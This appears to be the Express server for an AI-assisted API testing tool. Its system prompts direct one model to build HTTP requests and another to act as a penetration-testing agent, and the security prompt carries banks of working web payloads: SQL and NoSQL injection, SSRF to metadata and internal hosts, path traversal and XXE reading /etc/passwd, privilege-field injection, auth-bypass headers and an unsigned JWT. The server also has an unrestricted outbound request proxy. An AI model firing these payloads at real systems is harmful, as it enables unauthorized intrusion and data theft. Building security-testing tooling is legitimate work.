const path = require('path');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
const PORT = Number(process.env.PORT || 3000);
const OPENROUTER_API_KEY = process.env.OPENROUTER_API_KEY || '';

const OPENROUTER_MODELS = {
  default: 'openrouter/auto',
  advanced: 'openai/gpt-4o-mini',
  security: process.env.OPENROUTER_SECURITY_MODEL || 'openai/gpt-4o'
};

const AGENT_MASTER_PROMPT = `You are AgentMan — an agentic backend engine for a Postman-like API IDE.
You receive structured context about the user's current HTTP request and last response,
then return a strict JSON action payload that the IDE frontend executes directly.

CONTEXT YOU WILL RECEIVE (per turn)
- current_mode: "planning" | "ask" | "agent"
- chat_session_id: number
- chat_goal: string
- conversation_history: array of { role, text }
- current_request: { method, url, headers[], params[], body }
- last_response:   { status, elapsed_ms, body_preview (first 800 chars) } | null
- current_assertions: string[] of JS expressions | []
- user_message: plain English instruction

OUTPUT CONTRACT — STRICT JSON, NO MARKDOWN
Always respond with exactly this shape:
{
  "message": "one-sentence natural language summary for the user",
  "actions": [ ...action objects ]
}

Actions array may be empty or contain multiple objects.
Each action MUST be one of the following typed objects:

1. SET_REQUEST
{
  "type": "set_request",
  "name": "short display name",
  "method": "GET" | "POST" | "PUT" | "PATCH" | "DELETE",
  "url": "https://full.url/path",
  "params":  [ { "k": "key", "v": "value" } ],
  "headers": [ { "k": "Content-Type", "v": "application/json" } ],
  "body": "raw string body or empty string"
}

2. SET_ASSERTIONS
{
  "type": "set_assertions",
  "assertions": [
    "status === 200",
    "Array.isArray(json)",
    "json.length > 0",
    "json[0].hasOwnProperty('id')",
    "typeof json[0].name === 'string'"
  ]
}
Assertions are JS expressions. Available variables: status (number), json (parsed object or null), body (raw string).

3. CHAIN_REQUEST
{
  "type": "chain_request",
  "name": "short display name",
  "method": "GET" | "POST" | "PUT" | "PATCH" | "DELETE",
  "url": "https://api.example.com/users/{{json.id}}/posts",
  "params":  [],
  "headers": [],
  "body": "",
  "chainNote": "one sentence: what data is being chained and why"
}
Use {{json.fieldPath}} for dot-path references into the previous response JSON.
Examples: {{json.id}}, {{json.data.token}}, {{json.results[0].uuid}}

4. DEBUG_INFO
{
  "type": "debug_info",
  "findings": [
    "Status 401 — Authorization header is missing",
    "Content-Type is not set for a POST with body"
  ],
  "fix": "Add Authorization: Bearer <token> header and set Content-Type: application/json",
  "patch": {
    "headers": [ { "k": "Authorization", "v": "Bearer <token>" } ]
  }
}
patch is optional — include it only when the fix is a direct request mutation.

BEHAVIORAL RULES
1. NEVER return markdown, prose, or code fences. Raw JSON only.
2. For public demo APIs default to: jsonplaceholder.typicode.com, reqres.in, httpbin.org.
3. For assertion generation: always produce 4–6 expressions. Cover status code,
   response shape (Array.isArray, typeof), key field existence, and one value check.
4. For chaining: inspect last_response body_preview to infer real field names.
   Prefer json.id, json.data.id, json.results[0].id in that priority order.
5. For debugging: check in order — status code semantics, missing auth headers,
   wrong Content-Type, malformed JSON body, CORS (if browser error), URL typos.
6. If user_message is ambiguous, prefer set_request over asking a clarifying question.
   Make a reasonable assumption and state it in "message".
7. Actions may be combined in one response. Example: set_request + set_assertions together.
8. Never include secrets or real credentials. Use placeholder strings like <your-token>.`;

const MODE_RULES_PROMPT = `MODE-SPECIFIC BEHAVIOR
- If current_mode is "ask": focus on explanation, debugging analysis, or guidance. Return actions as [] unless the user explicitly asks to build/modify a request.
- If current_mode is "planning": provide a concise execution plan in message and suggest non-destructive actions only. Do not assume immediate execution.
- If current_mode is "agent": you may return executable actions for request construction and test flow automation.
- In "agent" mode, when the task is complete, return actions: [] and set message to a final summary that starts with "Conclusion:".`;

const CONTEXT_AWARENESS_PROMPT = `CONTEXT-AWARENESS
- Use chat_goal and conversation_history to avoid repeating already completed steps.
- Keep continuity with prior turns in the same chat_session_id.
- If the user starts a new objective, adapt quickly and state the updated objective in message.`;

const SECURITY_MASTER_PROMPT = `You are AgentMan Security - an agentic penetration testing engine embedded in an API IDE.
You systematically probe REST endpoints for security vulnerabilities using HTTP requests.
You think like an offensive security researcher: methodical, evidence-based, non-destructive by default.

THREAT CATEGORIES YOU TEST (mapped to HTTP methods)

GET  -> Information disclosure, IDOR, path traversal, parameter pollution,
        unauthenticated access, verbose error leakage, cache poisoning

POST -> Injection (SQLi, NoSQLi, command), mass assignment, authentication bypass,
        SSRF, XXE, unrestricted file upload, business logic abuse, rate limit bypass

PUT  -> Unauthorized resource overwrite, privilege escalation via body fields,
        IDOR on resource IDs, schema pollution

PATCH -> Partial update abuse, role/permission field tampering, BOLA

DELETE -> Unauthorized deletion, IDOR, cascade delete abuse, soft-delete bypass

CONTEXT YOU RECEIVE PER TURN
- target_url        : base URL under test
- current_request   : { method, url, headers[], params[], body }
- last_response     : { status, elapsed_ms, body_preview } | null
- auth_context      : { type: "none"|"bearer"|"basic"|"apikey", value: string } | null
- test_history      : [ { method, url, status, finding } ]
- user_instruction  : plain English command from the tester

OUTPUT CONTRACT - RAW JSON ONLY, ZERO MARKDOWN
{
  "message": "one sentence summary of what you are doing and why",
  "threat_level": "none" | "low" | "medium" | "high" | "critical",
  "findings": [
    {
      "id": "FINDING-001",
      "vulnerability": "short name e.g. IDOR, SQLi, Auth Bypass",
      "severity": "info" | "low" | "medium" | "high" | "critical",
      "evidence": "exact field/value/header from the response that proves this",
      "cve_hint": "CVE-YYYY-NNNNN or CWE-NNN if applicable, else null",
      "remediation": "one sentence fix"
    }
  ],
  "actions": [ ...action objects ]
}

ACTION TYPES

1) PROBE
{
  "type": "probe",
  "name": "short test name",
  "method": "GET" | "POST" | "PUT" | "PATCH" | "DELETE",
  "url": "full URL with injected payload if needed",
  "headers": [ { "k": "Authorization", "v": "Bearer <tampered_token>" } ],
  "params": [ { "k": "id", "v": "' OR 1=1 --" } ],
  "body": "raw string - JSON, XML, or raw payload",
  "vector": "IDOR" | "SQLi" | "NoSQLi" | "AuthBypass" | "SSRF" | "XXE" |
            "MassAssignment" | "RateLimit" | "PathTraversal" | "BOLA" |
            "InfoDisclosure" | "CommandInjection" | "ParameterPollution" |
            "CachePoisoning" | "UnrestrictedUpload" | "BusinessLogic",
  "hypothesis": "what a positive result looks like",
  "auto_chain": true | false
}

2) PROBE_CHAIN
{
  "type": "probe_chain",
  "name": "attack chain name",
  "steps": [
    {
      "step": 1,
      "name": "Register low-priv user",
      "method": "POST",
      "url": "https://target.com/api/register",
      "headers": [],
      "body": "{\"username\":\"attacker01\",\"password\":\"P@ssw0rd!\",\"role\":\"admin\"}",
      "vector": "MassAssignment",
      "extract": { "token": "json.token", "userId": "json.id" }
    }
  ]
}

3) FUZZ_LIST
{
  "type": "fuzz_list",
  "target_param": "id",
  "target_location": "url" | "body" | "header" | "query",
  "vector": "SQLi",
  "payloads": ["' OR 1=1 --"],
  "success_indicators": {
    "status_codes": [200, 500],
    "body_contains": ["syntax error", "mysql", "ORA-", "pg_query", "unclosed quotation"],
    "time_delta_ms": 4500
  }
}

4) SET_ASSERTIONS
{
  "type": "set_assertions",
  "assertions": [
    "status !== 200",
    "!body.includes('stack trace')",
    "!body.includes('SQLException')",
    "!body.includes('password')",
    "json === null || !json.hasOwnProperty('role')",
    "status === 401 || status === 403"
  ]
}

5) SCAN_PLAN
{
  "type": "scan_plan",
  "target": "https://api.target.com/users/{id}",
  "method_coverage": ["GET", "POST", "PUT", "DELETE"],
  "steps": [
    { "order": 1, "vector": "InfoDisclosure",  "description": "Hit without auth - check for 401 vs 200 vs 403" }
  ]
}

6) DEBUG_INFO
{
  "type": "debug_info",
  "findings": ["Status 500 leaks internal stack trace", "Server header exposes framework version"],
  "fix": "Suppress verbose errors in production; strip Server header",
  "patch": {
    "headers": [ { "k": "X-Custom-Header", "v": "test" } ]
  }
}

PAYLOAD BANKS - use these verbatim in fuzz_list and probe bodies

SQL INJECTION (GET param / POST body):
  ' OR 1=1 --
  ' OR '1'='1'; --
  1 UNION SELECT null,table_name FROM information_schema.tables --
  ' AND SLEEP(5) --
  '; EXEC xp_cmdshell('id') --
  ' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects)) --

NOSQL INJECTION (JSON body):
  {"username": {"$gt": ""}, "password": {"$gt": ""}}
  {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
  {"$where": "this.role == 'admin'"}

SSRF (URL params / body fields pointing to URLs):
  http://169.254.169.254/latest/meta-data/
  http://127.0.0.1:6379/
  http://0.0.0.0:22/
  http://internal-service.local/admin
  file:///etc/passwd

PATH TRAVERSAL (filename / path params):
  ../../etc/passwd
  ..%2F..%2Fetc%2Fpasswd
  ....//....//etc/passwd
  %2e%2e%2f%2e%2e%2fetc%2fpasswd

XXE (XML POST body):
  <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

MASS ASSIGNMENT (POST/PUT JSON body - inject privileged fields):
  {"role": "admin"}
  {"isAdmin": true}
  {"permissions": ["read","write","delete","admin"]}
  {"__proto__": {"isAdmin": true}}
  {"constructor": {"prototype": {"isAdmin": true}}}

AUTH BYPASS HEADERS:
  X-Original-URL: /admin
  X-Forwarded-For: 127.0.0.1
  X-Remote-User: admin
  X-Custom-IP-Authorization: 127.0.0.1
  Authorization: Bearer null
  Authorization: Bearer undefined
  Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.

BEHAVIORAL RULES
1. Raw JSON only. No markdown, no prose, no code fences.
2. Never generate payloads targeting real production infrastructure unless auth_context confirms explicit written authorization.
3. One vector per probe action.
4. evidence in findings MUST quote actual response content - never inferred.
5. If last_response.status === 500 -> always generate a debug_info action.
6. If last_response body contains "password", "secret", "token", "key" in plaintext -> auto-elevate finding to HIGH and include in findings array.
7. For IDOR probes, always test: id-1, id+1, id*2, id=0, id=99999, id=null, id=-1.
8. For auth tests, always test: no header, wrong scheme, expired token, alg:none JWT, and role-escalated JWT payload.
9. scan_plan is always the first action when user_instruction contains "scan", "audit", "test all", or "full check".
10. threat_level escalation is permanent within a session - it never decreases once raised.`;

app.use(express.json({ limit: '1mb' }));
app.use(express.static(__dirname));

app.get('/', (_req, res) => {
  res.sendFile(path.join(__dirname, 'agentman.html'));
});

function assertApiKeyConfigured() {
  if (!OPENROUTER_API_KEY) {
    const err = new Error('Server is missing OPENROUTER_API_KEY. Add it to .env.');
    err.status = 500;
    throw err;
  }
}

function parseModel(model) {
  if (model === OPENROUTER_MODELS.security) return OPENROUTER_MODELS.security;
  if (model === OPENROUTER_MODELS.advanced) return OPENROUTER_MODELS.advanced;
  return OPENROUTER_MODELS.default;
}

async function openRouterGenerateJson({ model, systemPrompt, userContent, temperature = 0.2, maxTokens = 1000 }) {
  assertApiKeyConfigured();

  const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${OPENROUTER_API_KEY}`,
      'HTTP-Referer': `http://localhost:${PORT}`,
      'X-Title': 'AgentMan'
    },
    body: JSON.stringify({
      model: parseModel(model),
      messages: [
        { role: 'system', content: systemPrompt },
        { role: 'user', content: userContent }
      ],
      temperature,
      max_tokens: maxTokens,
      response_format: { type: 'json_object' }
    })
  });

  let data;
  try {
    data = await response.json();
  } catch {
    const err = new Error('OpenRouter API returned a non-JSON response.');
    err.status = 502;
    throw err;
  }

  if (!response.ok) {
    const err = new Error(data?.error?.message || `OpenRouter API error (${response.status}).`);
    err.status = response.status;
    throw err;
  }

  const content = data?.choices?.[0]?.message?.content;
  if (typeof content === 'string' && content.trim()) return content;
  if (Array.isArray(content)) {
    const text = content
      .map(part => {
        if (typeof part === 'string') return part;
        if (part && typeof part.text === 'string') return part.text;
        return '';
      })
      .join('');
    if (text.trim()) return text;
  }

  const err = new Error('OpenRouter API returned an unexpected content shape.');
  err.status = 502;
  throw err;
}

function parseAgentPayload(raw) {
  let parsed;
  try {
    parsed = JSON.parse((raw || '').trim());
  } catch {
    const err = new Error('Model output was not valid JSON.');
    err.status = 502;
    throw err;
  }

  if (!parsed || typeof parsed !== 'object') {
    const err = new Error('Model output must be a JSON object.');
    err.status = 502;
    throw err;
  }
  if (typeof parsed.message !== 'string' || !Array.isArray(parsed.actions)) {
    const err = new Error('Model output is missing required fields: message/actions.');
    err.status = 502;
    throw err;
  }
  return parsed;
}

function parseSecurityPayload(raw) {
  let parsed;
  try {
    parsed = JSON.parse((raw || '').trim());
  } catch {
    const err = new Error('Security model output was not valid JSON.');
    err.status = 502;
    throw err;
  }

  if (!parsed || typeof parsed !== 'object') {
    const err = new Error('Security model output must be a JSON object.');
    err.status = 502;
    throw err;
  }

  const levels = new Set(['none', 'low', 'medium', 'high', 'critical']);
  const findingSeverities = new Set(['info', 'low', 'medium', 'high', 'critical']);

  if (typeof parsed.message !== 'string') {
    const err = new Error('Security model output is missing required field: message.');
    err.status = 502;
    throw err;
  }
  if (!levels.has(parsed.threat_level)) {
    const err = new Error('Security model output has invalid threat_level.');
    err.status = 502;
    throw err;
  }
  if (!Array.isArray(parsed.findings) || !Array.isArray(parsed.actions)) {
    const err = new Error('Security model output is missing required arrays: findings/actions.');
    err.status = 502;
    throw err;
  }

  parsed.findings.forEach((finding, index) => {
    if (!finding || typeof finding !== 'object') {
      const err = new Error(`Security finding at index ${index} must be an object.`);
      err.status = 502;
      throw err;
    }
    if (!findingSeverities.has(finding.severity)) {
      const err = new Error(`Security finding at index ${index} has invalid severity.`);
      err.status = 502;
      throw err;
    }
  });

  return parsed;
}

app.post('/api/agent', async (req, res) => {
  try {
    const context = req.body?.context;
    const model = req.body?.model;

    if (!context || typeof context !== 'object') {
      return res.status(400).json({ error: 'Missing request body field: context (object).' });
    }

    const raw = await openRouterGenerateJson({
      model,
      systemPrompt: `${AGENT_MASTER_PROMPT}\n\n${MODE_RULES_PROMPT}\n\n${CONTEXT_AWARENESS_PROMPT}`,
      userContent: JSON.stringify(context)
    });

    const payload = parseAgentPayload(raw);
    return res.json(payload);
  } catch (error) {
    const status = Number(error.status || 500);
    return res.status(status).json({ error: error.message || 'Failed to process agent request.' });
  }
});

app.post('/api/assertions', async (req, res) => {
  try {
    const status = req.body?.status;
    const bodyPreview = req.body?.body_preview;
    const model = req.body?.model;

    if (typeof status !== 'number') {
      return res.status(400).json({ error: 'Missing request body field: status (number).' });
    }

    const instruction = {
      instruction: 'Generate 4 to 6 useful test assertions as JS expressions using variables: status, json, body. Return shape: {"assertions": ["..."]}.',
      status,
      body_preview: typeof bodyPreview === 'string' ? bodyPreview : ''
    };

    const raw = await openRouterGenerateJson({
      model,
      systemPrompt: 'You are an API testing assistant. Return strict JSON only.',
      userContent: JSON.stringify(instruction)
    });

    let parsed;
    try {
      parsed = JSON.parse(raw);
    } catch {
      return res.status(502).json({ error: 'Assertion generator returned invalid JSON.' });
    }

    const assertions = Array.isArray(parsed?.assertions)
      ? parsed.assertions.filter(x => typeof x === 'string' && x.trim())
      : [];

    return res.json({ assertions });
  } catch (error) {
    const status = Number(error.status || 500);
    return res.status(status).json({ error: error.message || 'Failed to generate assertions.' });
  }
});

app.post('/api/security-agent', async (req, res) => {
  try {
    const model = req.body?.model || OPENROUTER_MODELS.security;
    const bodyContext = req.body?.context;
    const context = bodyContext && typeof bodyContext === 'object'
      ? bodyContext
      : {
          target_url: req.body?.target_url ?? '',
          current_request: req.body?.current_request ?? null,
          last_response: req.body?.last_response ?? null,
          auth_context: req.body?.auth_context ?? null,
          test_history: req.body?.test_history ?? [],
          user_instruction: req.body?.user_instruction ?? ''
        };

    if (!context || typeof context !== 'object') {
      return res.status(400).json({ error: 'Missing security context object.' });
    }

    const raw = await openRouterGenerateJson({
      model,
      systemPrompt: SECURITY_MASTER_PROMPT,
      userContent: JSON.stringify(context),
      temperature: 0.1,
      maxTokens: 1800
    });

    const payload = parseSecurityPayload(raw);
    return res.json(payload);
  } catch (error) {
    const status = Number(error.status || 500);
    return res.status(status).json({ error: error.message || 'Failed to process security agent request.' });
  }
});

app.post('/api/request', async (req, res) => {
  try {
    const method = typeof req.body?.method === 'string' ? req.body.method.toUpperCase() : 'GET';
    const url = typeof req.body?.url === 'string' ? req.body.url.trim() : '';
    const headers = req.body?.headers && typeof req.body.headers === 'object' ? req.body.headers : {};
    const body = typeof req.body?.body === 'string' ? req.body.body : '';

    const allowedMethods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'];
    if (!allowedMethods.includes(method)) {
      return res.status(400).json({ error: `Unsupported method: ${method}` });
    }

    if (!url) {
      return res.status(400).json({ error: 'Missing request field: url' });
    }

    let parsedUrl;
    try {
      parsedUrl = new URL(url);
    } catch {
      return res.status(400).json({ error: 'Invalid URL' });
    }

    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
      return res.status(400).json({ error: 'Only http/https URLs are allowed.' });
    }

    const forwardHeaders = { ...headers };
    delete forwardHeaders.host;
    delete forwardHeaders.Host;
    delete forwardHeaders['content-length'];
    delete forwardHeaders['Content-Length'];

    const outbound = {
      method,
      headers: forwardHeaders
    };

    if (body && !['GET', 'HEAD'].includes(method)) {
      outbound.body = body;
      if (!outbound.headers['Content-Type'] && !outbound.headers['content-type']) {
        outbound.headers['Content-Type'] = 'application/json';
      }
    }

    const startedAt = Date.now();
    const upstream = await fetch(parsedUrl.toString(), outbound);
    const text = await upstream.text();
    const elapsed_ms = Date.now() - startedAt;
    const responseHeaders = Object.fromEntries(upstream.headers.entries());

    return res.status(200).json({
      status: upstream.status,
      statusText: upstream.statusText,
      elapsed_ms,
      headers: responseHeaders,
      body: text
    });
  } catch (error) {
    return res.status(502).json({ error: error.message || 'Upstream request failed.' });
  }
});

app.get('/api/health', (_req, res) => {
  res.json({
    ok: true,
    model_default: OPENROUTER_MODELS.default,
    model_security: OPENROUTER_MODELS.security
  });
});

app.listen(PORT, () => {
  console.log(`AgentMan server listening on http://localhost:${PORT}`);
});
